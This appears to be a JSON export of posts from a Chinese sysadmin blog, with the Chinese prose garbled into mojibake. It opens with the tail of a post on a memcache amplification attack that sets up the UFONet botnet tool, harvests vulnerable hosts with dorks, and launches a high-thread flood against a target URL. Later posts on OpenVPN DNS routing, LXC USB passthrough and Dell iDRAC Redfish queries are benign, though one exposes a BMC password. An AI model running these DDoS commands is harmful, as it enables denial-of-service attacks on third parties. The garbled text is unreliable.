pycurl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install geoip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install whois\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install crypto\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install request\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…ˆå»æ‹¿ä¸€å †æ¼æ´æœºå™¨çš„åˆ—è¡¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e ufonet  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/python ./ufonet --sd \u003cspan class=\"s1\"\u003e\u0026#39;botnet/dorks.txt\u0026#39;\u003c/span\u003e --sa\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè½°å‡»ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r \u003cspan class=\"m\"\u003e10000\u003c/span\u003e --threads \u003cspan class=\"m\"\u003e2000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Freelancerä»»åŠ¡ä¹‹ä¸ƒmemcache æ”¾å¤§æ”»å‡»"},{"content":"é›‡ä¸»ç»™äº†ä¸ªéš¾é¢˜ï¼Œä»–æ­å»ºäº†ä¸€ä¸ªopenvpnï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªDNS Serverï¼Œä¸€ä¸ªæ˜¯å¸¦ADå¹¿å‘Šè¿‡æ»¤çš„ï¼Œä¸€ä¸ªæ˜¯ä¸å¸¦çš„ã€‚è¿™ä¸¤ä¸ªdnsæœåŠ¡åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šï¼Œç«¯å£ä¸åŒã€‚\nä»–æƒ³è®©åœ¨openvpnçš„clientç«¯é…ç½®ä¸€ä¸‹ï¼Œè®©å®¢æˆ·ä½¿ç”¨ä¸åŒçš„dns serverã€‚\næ‰¾äº†åŠå¤©ï¼Œæ²¡æœ‰èƒ½ä¿®æ”¹dns portçš„é…ç½®ã€‚\näºæ˜¯æ›²çº¿æ•‘å›½ã€‚\næ–¹æ¡ˆå¦‚ä¸‹ï¼šå®¢æˆ·ç«¯å›ºå®šIPï¼Œæ ¹æ®ä¸åŒçš„æ¥æºIPæ¥åˆ†å‘åˆ°ä¸åŒçš„DNSå»ã€‚\næœ¬æ¥æ˜¯æƒ³ç”¨V2EXä¸€ä¸ªå“¥ä»¬è‡ªå·±å†™çš„gliderï¼Œå¼„äº†åŠå¤©ï¼Œä¸çŸ¥é“æ€ä¹ˆé…ï¼Œä¸è¿‡åŠŸèƒ½è‚¯å®šæ˜¯èƒ½å®ç°çš„ã€‚æœ€å·®å°±æ˜¯è‡ªå·±æ”¹goä»£ç äº†ã€‚\nå¿«é€Ÿèµ·è§ï¼Œç”¨äº†å¦å¤–ä¸€ä¸ªå“¥ä»¬çš„dns-dispatcherï¼Œå°±æ˜¯dnsåˆ†å‘ï¼Œglideræ˜¯å½»åº•çš„å„ç§ä»£ç†è½¬å‘ï¼Œé“¾æ¡ä»£ç†ï¼Œéå¸¸å¼ºæ‚ã€‚\nå…‹éš†dns-dispatcherä»£ç \ngit clone https://github.com/cathuhoo/dns-dispatcher ç¼–è¯‘ï¼š\nmake é…ç½®ï¼Œæˆ‘ä»¬åªé…ç½®äº†udpçš„53ç«¯å£ï¼Œæ ‡å‡†çš„DNSç«¯å£\nvi dns-dispatch.config ; This is a test configuration file [main] file_resolvers = resolvers.txt file_policy = policy.txt file_log = /var/log/dns-dispatch.log file_pid = /var/run/dns-dispatch.pid num_threads = 3 service_port = 53 #tcpservice_port = 53 daemonize = yes é…ç½®ç­–ç•¥ï¼š\nvi policy.txt ip2 | * | Forward:bind2 ip1 | * | Forward:bind1 é…ç½®ip1å’Œip2\nvi ip1 10.10.1.2 vi ip2 10.10.1.3 é…ç½®bind1å’Œbind2ï¼Œä¸¤ä¸ªdnsåœ¨10.10.1.1ä¸Šï¼Œç«¯å£åˆ†åˆ«æ˜¯5301å’Œ5302\nvi resolvers.txt bind1|10.10.1.1|5301 bind2|10.10.1.1|5302 è¿è¡Œï¼š\nsudo ./dns-dispatch -c dns-dispatch.config OKï¼Œæå®šï¼Œæ‰€æœ‰çš„é…ç½®éƒ½åœ¨æ–‡ä»¶é‡Œï¼Œè¿˜æœ‰åˆ«çš„ç”¨æ³•ï¼Œå¤§å®¶ç”¨çš„è¯è‡ªå·±çœ‹æ–‡æ¡£å§ã€‚\næœ€ååˆ†åˆ«ä»10.10.1.2å’Œ10.10.1.3ä¸Šé¢ç”¨dig è¯·æ±‚dns server 10.10.1.1ï¼Œä¼šå¾—åˆ°ä¸åŒçš„ç»“æœ\ndig -t www.bbb.com @10.10.1.1 ","permalink":"https://rendoumi.com/posts/20240124_freelancer_8/","summary":"\u003cp\u003eé›‡ä¸»ç»™äº†ä¸ªéš¾é¢˜ï¼Œä»–æ­å»ºäº†ä¸€ä¸ªopenvpnï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªDNS Serverï¼Œä¸€ä¸ªæ˜¯å¸¦ADå¹¿å‘Šè¿‡æ»¤çš„ï¼Œä¸€ä¸ªæ˜¯ä¸å¸¦çš„ã€‚è¿™ä¸¤ä¸ªdnsæœåŠ¡åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šï¼Œç«¯å£ä¸åŒã€‚\u003c/p\u003e\n\u003cp\u003eä»–æƒ³è®©åœ¨openvpnçš„clientç«¯é…ç½®ä¸€ä¸‹ï¼Œè®©å®¢æˆ·ä½¿ç”¨ä¸åŒçš„dns serverã€‚\u003c/p\u003e\n\u003cp\u003eæ‰¾äº†åŠå¤©ï¼Œæ²¡æœ‰èƒ½ä¿®æ”¹dns portçš„é…ç½®ã€‚\u003c/p\u003e\n\u003cp\u003eäºæ˜¯æ›²çº¿æ•‘å›½ã€‚\u003c/p\u003e\n\u003cp\u003eæ–¹æ¡ˆå¦‚ä¸‹ï¼šå®¢æˆ·ç«¯å›ºå®šIPï¼Œæ ¹æ®ä¸åŒçš„æ¥æºIPæ¥åˆ†å‘åˆ°ä¸åŒçš„DNSå»ã€‚\u003c/p\u003e\n\u003cp\u003eæœ¬æ¥æ˜¯æƒ³ç”¨V2EXä¸€ä¸ªå“¥ä»¬è‡ªå·±å†™çš„gliderï¼Œå¼„äº†åŠå¤©ï¼Œä¸çŸ¥é“æ€ä¹ˆé…ï¼Œä¸è¿‡åŠŸèƒ½è‚¯å®šæ˜¯èƒ½å®ç°çš„ã€‚æœ€å·®å°±æ˜¯è‡ªå·±æ”¹goä»£ç äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¿«é€Ÿèµ·è§ï¼Œç”¨äº†å¦å¤–ä¸€ä¸ªå“¥ä»¬çš„dns-dispatcherï¼Œå°±æ˜¯dnsåˆ†å‘ï¼Œglideræ˜¯å½»åº•çš„å„ç§ä»£ç†è½¬å‘ï¼Œé“¾æ¡ä»£ç†ï¼Œéå¸¸å¼ºæ‚ã€‚\u003c/p\u003e\n\u003cp\u003eå…‹éš†dns-dispatcherä»£ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/cathuhoo/dns-dispatcher  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¯‘ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé…ç½®ï¼Œæˆ‘ä»¬åªé…ç½®äº†udpçš„53ç«¯å£ï¼Œæ ‡å‡†çš„DNSç«¯å£\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi dns-dispatch.config  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e This is a \u003cspan class=\"nb\"\u003etest\u003c/span\u003e configuration file\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emain\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_resolvers\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e resolvers.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_policy\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e policy.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_log\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/dns-dispatch.log  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_pid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/run/dns-dispatch.pid  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eservice_port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e53\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#tcpservice_port = 53\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edaemonize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé…ç½®ç­–ç•¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi policy.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip2 \u003cspan class=\"p\"\u003e|\u003c/span\u003e * \u003cspan class=\"p\"\u003e|\u003c/span\u003e Forward:bind2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e * \u003cspan class=\"p\"\u003e|\u003c/span\u003e Forward:bind1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé…ç½®ip1å’Œip2\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ip1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.1.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ip2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.1.3  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé…ç½®bind1å’Œbind2ï¼Œä¸¤ä¸ªdnsåœ¨10.10.1.1ä¸Šï¼Œç«¯å£åˆ†åˆ«æ˜¯5301å’Œ5302\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi resolvers.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind1\u003cspan class=\"p\"\u003e|\u003c/span\u003e10.10.1.1\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e5301\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind2\u003cspan class=\"p\"\u003e|\u003c/span\u003e10.10.1.1\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e5302\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./dns-dispatch -c dns-dispatch.config  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOKï¼Œæå®šï¼Œæ‰€æœ‰çš„é…ç½®éƒ½åœ¨æ–‡ä»¶é‡Œï¼Œè¿˜æœ‰åˆ«çš„ç”¨æ³•ï¼Œå¤§å®¶ç”¨çš„è¯è‡ªå·±çœ‹æ–‡æ¡£å§ã€‚\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹å…«openvpnçš„DNSåˆ†å‘"},{"content":"æµ‹è¯•çš„åŒäº‹è¦åœ¨æµ‹è¯•æœºä¸Šå®‰è£…android studioï¼Œadbç›´æ¥è°ƒè¯•æ‰‹æœºã€‚\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œæµ‹è¯•æœºå®é™…æ˜¯ä¸ªlxcçš„å®¹å™¨ï¼Œéœ€è¦æŠŠæ’åœ¨å®¿ä¸»æœºusbä¸Šçš„æ‰‹æœºç›´æ¥è¿‡ç»™å®¹å™¨ã€‚\nè¯´ä¸‹åšæ³•ï¼š é¦–å…ˆåœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œlsusbï¼ŒæŸ¥å‡ºæ‰‹æœºUSBï¼š\n[root@localhost]# lsusb Bus 001 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub Bus 002 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 001 Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone [Galaxy S II], GT-I9300 Phone [Galaxy S III], GT-P7500 [Galaxy Tab 10.1] , GT-I9500 [Galaxy S 4] Bus 001 Device 004: ID 0624:0248 Avocent Corp. Virtual Hub Bus 001 Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse çœ‹æœ€é•¿çš„å¸¦GT-I9100é‚£ä¸€è¡Œï¼ŒID 04e8:6860ï¼ŒVendorID:ProdIDï¼Œè¯´æ˜Vendor=04e8 ProdID=6860ï¼Œè®°ä¸‹æ¥ã€‚\nå¹¶ä¸”è®°ä¸‹æ¥Bus 001ï¼ŒDevice 014\nä¸€åˆ‡è®¾å¤‡çš†æ–‡ä»¶ï¼Œçœ‹çœ‹å…·ä½“çš„æ–‡ä»¶å§ï¼š\nls -l /dev/bus/usb/001/014 crw-rw-r--. 1 root root 189, 13 8æœˆ 29 10:31 /dev/bus/usb/001/014 è®°ä¸‹æ¥è¿™ä¸ª189\nç„¶åå»è™šæœºçš„é…ç½®æ–‡ä»¶é‡Œ æ³¨æ„ï¼Œæˆ‘ä»¬çš„lxcè™šæœºé…ç½®æ–‡ä»¶åœ¨/var/lib/docker/containers/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/config.lxcä¸­ï¼Œæˆ‘ä»¬çš„rootfsæ˜¯ï¼š\nlxc.rootfs = /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs Soï¼Œåœ¨rootfsç›®å½•ä¸‹çš„config.lxcæ–‡ä»¶ä¸­å¢åŠ 2è¡Œï¼Œè®©usbè®¾å¤‡ç›´é€šè™šæœºï¼š\nlxc.cgroup.devices.allow = c 189:* rwm lxc.mount.entry = /dev/bus/usb/001/014 /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs/dev/bus/usb/001/014 none bind,optional,create=file è¿˜æ²¡å®Œï¼š é‡å¯è™šæœºï¼Œè¿›å…¥å®¹å™¨ï¼Œå†™ä¸ªudevçš„rulesï¼Œè¿™ä¸ªæ²¡æµ‹è¯•æ˜¯å¦æœ‰å¿…è¦ï¼Œå› ä¸ºå…¶å®udevæœåŠ¡æ ¹æœ¬æ²¡åœ¨å®¹å™¨é‡Œè·‘å•Š\nvi /etc/udev/rules.d/51-android.rules SUBSYSTEMS==\u0026#34;usb\u0026#34;, ATTRS{idVendor}==\u0026#34;04e8\u0026#34;, ATTRS{idProduct}==\u0026#34;6860\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;root\u0026#34; ç»§ç»­ï¼Œä¿®æ”¹å®¹å™¨ä¸­çš„adb_usb.iniï¼ŒæŠŠVendorIDåŠ è¿›å»\nvi ~/.android/adb_usb.ini # ANDROID 3RD PARTY USB VENDOR ID LIST -- DO NOT EDIT. # USE \u0026#39;android update adb\u0026#39; TO GENERATE. # 1 USB VENDOR ID PER LINE. 0x04e8 é‡å¯å®¹å™¨ï¼Œadbè¢«è£…åœ¨/opt/sdk/platform-tools/è·¯å¾„ä¸‹ï¼Œè¿›å»åæ‰§è¡Œï¼š\n/opt/sdk/platform-tools/adb start-server /opt/sdk/platform-tools/adb devices List of devices attached 0376b638 unauthorized OKæå®šã€‚\n","permalink":"https://rendoumi.com/posts/20240124-lxc_usb_pass_through/","summary":"\u003cp\u003eæµ‹è¯•çš„åŒäº‹è¦åœ¨æµ‹è¯•æœºä¸Šå®‰è£…\u003ccode\u003eandroid studio\u003c/code\u003eï¼Œadbç›´æ¥è°ƒè¯•æ‰‹æœºã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸‹éº»çƒ¦äº†ï¼Œæµ‹è¯•æœºå®é™…æ˜¯ä¸ª\u003ccode\u003elxc\u003c/code\u003eçš„å®¹å™¨ï¼Œéœ€è¦æŠŠæ’åœ¨å®¿ä¸»æœºusbä¸Šçš„æ‰‹æœºç›´æ¥è¿‡ç»™å®¹å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eè¯´ä¸‹åšæ³•ï¼š é¦–å…ˆåœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œlsusbï¼ŒæŸ¥å‡ºæ‰‹æœºUSBï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eroot@localhost\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"c1\"\u003e# lsusb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e002\u003c/span\u003e Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e002\u003c/span\u003e Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S II\u003cspan class=\"o\"\u003e]\u003c/span\u003e, GT-I9300 Phone \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S III\u003cspan class=\"o\"\u003e]\u003c/span\u003e, GT-P7500 \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy Tab 10.1\u003cspan class=\"o\"\u003e]\u003c/span\u003e , GT-I9500 \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S 4\u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 004: ID 0624:0248 Avocent Corp. Virtual Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹æœ€é•¿çš„å¸¦\u003ccode\u003eGT-I9100\u003c/code\u003eé‚£ä¸€è¡Œï¼Œ\u003ccode\u003eID 04e8:6860ï¼ŒVendorID:ProdID\u003c/code\u003eï¼Œè¯´æ˜\u003ccode\u003eVendor=04e8 ProdID=6860\u003c/code\u003eï¼Œè®°ä¸‹æ¥ã€‚\u003c/p\u003e","title":"lxcä¸‹å¦‚ä½•è®©usbè®¾å¤‡pass throughç›´æ¥åˆ°è¾¾è™šæœº"},{"content":"å„å¤§ä¸»æ¿å‚å•†çº·çº·æ”¯æŒä¸‹ä¸€ä»£å¸¦å¤–ç®¡ç†æ ‡å‡†redfishã€‚\nå…¶å®Dellçš„idracç®¡ç†åšçš„æ˜¯ç›¸å½“å¥½çš„ï¼Œé‚£ä¹ˆæ¥çœ‹çœ‹å¯¹redfishçš„æ”¯æŒå§ã€‚\nå…ˆçœ‹çœ‹v1éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤\ncurl -s \u0026#34;https://10.16.24.15/redfish/v1\u0026#34; -k -u root:xxxxxxxx | jq . ç»“æœå¦‚ä¸‹ï¼š { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ServiceRoot.ServiceRoot\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ServiceRoot.v1_1_0.ServiceRoot\u0026#34;, \u0026#34;AccountService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService\u0026#34; }, \u0026#34;Chassis\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis\u0026#34; }, \u0026#34;Description\u0026#34;: \u0026#34;Root Service\u0026#34;, \u0026#34;EventService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/EventService\u0026#34; }, \u0026#34;Id\u0026#34;: \u0026#34;RootService\u0026#34;, \u0026#34;JsonSchemas\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/JSONSchemas\u0026#34; }, \u0026#34;Links\u0026#34;: { \u0026#34;Sessions\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions\u0026#34; } }, \u0026#34;Managers\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers\u0026#34; }, \u0026#34;Name\u0026#34;: \u0026#34;Root Service\u0026#34;, \u0026#34;Oem\u0026#34;: { \u0026#34;Dell\u0026#34;: { \u0026#34;@odata.type\u0026#34;: \u0026#34;#DellServiceRoot.v1_0_0.ServiceRootSummary\u0026#34;, \u0026#34;IsBranded\u0026#34;: 0, \u0026#34;ManagerMACAddress\u0026#34;: \u0026#34;50:9A:4C:82:B9:3F\u0026#34;, \u0026#34;ServiceTag\u0026#34;: \u0026#34;7Q9N8P2\u0026#34; } }, \u0026#34;RedfishVersion\u0026#34;: \u0026#34;1.0.2\u0026#34;, \u0026#34;Registries\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Registries\u0026#34; }, \u0026#34;SessionService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/SessionService\u0026#34; }, \u0026#34;Systems\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Systems\u0026#34; }, \u0026#34;Tasks\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/TaskService\u0026#34; }, \u0026#34;UpdateService\u0026#34;: { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/UpdateService\u0026#34; } } å¥½å¤šæœåŠ¡æ’’ï¼ŒæŒ‘å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯çœ‹çœ‹ï¼š\ncurl -s \u0026#34;https://10.16.24.15/redfish/v1/Chassis\u0026#34; -k -u root:alibaba | jq . ç»“æœå¦‚ä¸‹ï¼š { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, \u0026#34;Members\u0026#34;: [ { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; }, { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; } ], \u0026#34;Members@odata.count\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; } å†è¯•è¯•Sessionçš„ç®¡ç†ï¼š\ncurl -v -k -X POST -d \u0026#39;{\u0026#34;UserName\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;xxxxxxxx\u0026#34;}\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; https://10.16.24.15/redfish/v1/Sessions | jq . 